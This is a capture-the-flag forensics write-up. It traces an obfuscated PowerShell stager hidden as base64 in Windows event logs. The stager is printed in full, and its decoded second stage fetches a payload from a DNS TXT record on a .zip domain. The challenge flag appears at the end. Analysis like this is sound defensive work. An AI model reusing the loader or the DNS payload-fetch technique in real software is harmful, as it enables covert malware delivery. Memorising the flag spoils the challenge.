## LogJam

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/cde20ec8-75ff-4606-8a98-1fb63e7abf3a)

## Solution

For this challenge, we get a couple EventViewer logs and a shortcut:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a8f09c5c-3c3b-480c-970b-60bbd3a16e43)

I converted the Application.evtx to an XML so that I can read it more easily:  

```bash
sudo apt instal python3-evtx
evtx_dump.py Application.evtx > Application.xml
```

In it we find a large Base64 blob:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/57ac94b3-a563-4d4a-b60c-bc66791d7aa1)

After base64 decoding it twice, we get an obfuscated powershell script:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a270a283-6927-45b5-a9fd-2e7c381f3698)

I'm pretty used to reading backwards so I can easily tell this is using Invoke-Expression to run the powershell:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/e23c2882-4aac-4371-a921-ea1f0ba21d7f)

So I replace it with an `echo` written backwards:  

```powershell
 $u7fInY =  [ChAr[]]")''nIOj-]2,11,3[eman.)'*Rdm*' elBAirav-TEg(( & |)93]rAhC[]gNIRTS[,)201]rAhC[+17]rAhC[+68]rAhC[((EcALper.)') (DnEOTdAEr.))iicsa::]gNIdoCNe.TxEt.mETSy'+'s[ , )'+')SsERpMocED::]eDOMNoISSerpMoC.NoIsSERpMOc.OI.metSYs'+'[ ,)'+'fGV=8w+2IX2i/'+'/Px+D1LdDdvgDHx0Da4rfSsissVDjqZXrXd'+'HwwgIMdd+b+'+'I2j3r4jNeKTYFX+H++mnP4L0u3sNsvJHmeAOLH88T030M0luhBzBIGCuwoZX7yZRbnbg7a174PITGc5Xlip/D/z6U5VZ7nO/APBWvIZYNhddwKDsG8A76A7fMef8'+'O6vMfncgC'+'i9gHHfQvjxq+y8Jibd+F+TdgqtK4HCOVjZg78/6RRhjg1A0YH4JIefd/ELkohlDo5GUdwKfiuZIDNFSfsr8Es9Z/T2gyyfY5K59mZ0WF/1ml58psO1MvbfWNxoNhpmDHyan05Am2y4XQm//iSEFVfHZE/Of8jPgvEPIfJ+ZwmLGNeVCUB3hMKc5n7cP713kzRx/a39WSVYB/eBqlcdk2QOQU30/PDdp9Yi3U3QRh8wg+eZu/T2XcjtA'+'3GZQ3AVQTpO6Zr2kvCRgKgVTrN7PANZe/RDBc+V8'+'EjJZgKCETT7pFpgWzmaCxrwq82DXSNNZ/FRZM'+'qDiCq2BulaQdboWAoa'+'H'+'n0EU9UD6QhrFOQRuu1yhr3lTRPcr5sjY428n3s/t5654O/iFOrvgegJUQFKfZ7RuYAQR1BPRah/TkpwdQwP7Z'+'D5HQ3rE'+'Gx'+'/KAZNGHAU9KCJBiglGYLkiq1xTF/iLXu0+kCybeHaht2u/syq0zKjeMn5vOIbvy+6mrt7/8qlTcm1'+'2CK1tomnNAb+cX6slpda2cm/tkFZfVajP/QGBalShL+o8ue/TBDiD9a+Nkx/V26O7cjU5Zx+9HW2'+'ie3y'+'FSiXK6C8TtKxk'+'T4E9fMU'+'KJgINRh32uWVr'+'JX'+'Lhyi2PAIkQJCiN1WUEqAFe/uljU8JPr4JbIqfDigSdZRClCUCfpHCrhUZY'+'4hy4ESnjVAtifBUTb/cgjdQmu/jWin+B2Wb54'+'PMHg8Oys'+'qv+'+'/Xbsn'+'67Hi5E3HcGbT78ftpLhAhuWQ7I0eCVg5pGNwVsJeiDejH/vXdKhUUdJcKbLa/Yx8mMFRqW5Wp1QhzszU2XlUqM7npZVGzssm55b4c2B5IB'+'QRZXnOiEzv/r5inQulI3WaFL0iX'+'Ij2JQ7cxOS1PXdLOEViOIqKYo93AXID8PQ+2PE4'+'s'+'9bpRVffGV (G'+'N'+'I'+'Rts46esa'+'BMOrF::]TrevNoC[]MAERTsYrOmeM.Oi'+'.meTsys[(mAErtseTALFed.nO'+'ISsErPmOc.oi.mETSy'+'s  tcEjBO-weN ( (REdAerMaeRtS.oi.meTsy'+'S  tcEjBO-weN ( ohce'("; [arRaY]::reverSe( (  VArIABle ('U7'+'fINY') -vA) );.( $VerbOSeprEfERencE.tOSTRing()[1,3]+'x'-JoiN'')( -JoIN(  VArIABle ('U7'+'fINY') -vA) )
```

I then run it in powershell and it unravels itself showing me the second stage.  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/6d61f99e-2b85-4bf1-9460-17bdd885183d)

We use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Comma',false)&input=NDAsODIsMTAxLDExNSwxMTEsMTA4LDExOCwxMDEsNDUsNjgsMTEwLDExNSw3OCw5NywxMDksMTAxLDMyLDM0LDk3LDExMiwxMTIsMTA4LDEwNSw5OSw5NywxMTYsMTA1LDExMSwxMTAsNDYsMTAxLDExOCwxMTYsMTIwLDQ2LDEyMiwxMDUsMTEyLDM0LDMyLDQ1LDg0LDEyMSwxMTIsMTAxLDMyLDExNiwxMjAsMTE2) to convert the decimal back to ASCII:

```text
40,82,101,115,111,108,118,101,45,68,110,115,78,97,109,101,32,34,97,112,112,108,105,99,97,116,105,111,110,46,101,118,116,120,46,122,105,112,34,32,45,84,121,112,101,32,116,120,116
```
We can tell that it is taking a payload from a DNS TXT record from a .zip domain... sneaky:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a8381344-7a39-47f6-b6c3-abba4305474d)

So we do the same to see what that record is:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/da82ed10-628f-4edc-a9ed-eb823cc1c7cf)

Luckily it's still live and it pops calc, but also has a comment with a base64 string:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/5c398089-4e50-4dd7-8c9e-30c991bc8539)

Which is our flag:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/04d2e451-a612-4fa9-b728-4b8e3b083785)

`flag{ca8c288d1395689577287ba3bf2649ad}`

